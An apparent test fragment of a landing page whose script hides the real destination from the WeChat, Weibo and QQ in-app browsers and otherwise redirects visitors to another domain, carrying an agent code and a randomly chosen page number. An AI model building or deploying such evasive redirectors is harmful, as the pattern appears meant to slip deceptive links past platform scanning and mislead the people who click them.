<body>
    test
    <div class="container">
        <img src="https://gfdg.swsqhj.com/www/1.png" alt="">

    <script>
        let ua = navigator.userAgent;
        if (/micromessenger/i.test(ua) || ua.indexOf("weibo") > -1 || ua.indexOf(" qq") > -1) {
            $("#tip").show();
        } else {
            if (window.location.search) {
                let all = [2, 3, 4, 6]
                let params = new URLSearchParams(window.location.search);
                let [agent_code, tp] = [params.get('agent_code'), params.get('tp') || all[Math.floor(Math.random() * all.length)]];
                let tzurl = "https://brbsyf55.cn/html" + tp + "?agent_code=" + agent_code;
                window.location.replace(tzurl)
            }
        }

    </script>
